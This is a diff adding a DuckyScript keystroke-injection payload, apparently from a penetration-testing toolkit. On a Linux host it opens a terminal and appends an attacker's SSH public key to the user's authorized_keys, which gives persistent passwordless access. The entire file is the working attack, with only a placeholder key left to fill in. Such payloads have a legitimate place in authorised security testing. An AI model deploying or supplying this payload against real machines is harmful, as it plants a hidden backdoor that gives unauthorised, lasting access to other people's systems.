@@ -1,0 +1,20 @@
+REM ============================================================
+REM  Linux · SSH Authorized Key Injection
+REM ============================================================
+REM  Appends an SSH public key to the current user's
+REM  authorized_keys. This gives persistent SSH access
+REM  without needing a password.
+REM
+REM  Replace the key below with your own (ssh-keygen -t ed25519).
+
+DEFAULTDELAY 80
+
+DEFINE PUBKEY ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyReplaceWithYourOwn auditor@charonsec
+
+CTRL ALT t
+DELAY 1500
+STRINGLN mkdir -p ~/.ssh && chmod 700 ~/.ssh
+STRINGLN echo "PUBKEY" >> ~/.ssh/authorized_keys
+STRINGLN chmod 600 ~/.ssh/authorized_keys
+DELAY 300
+STRINGLN exit
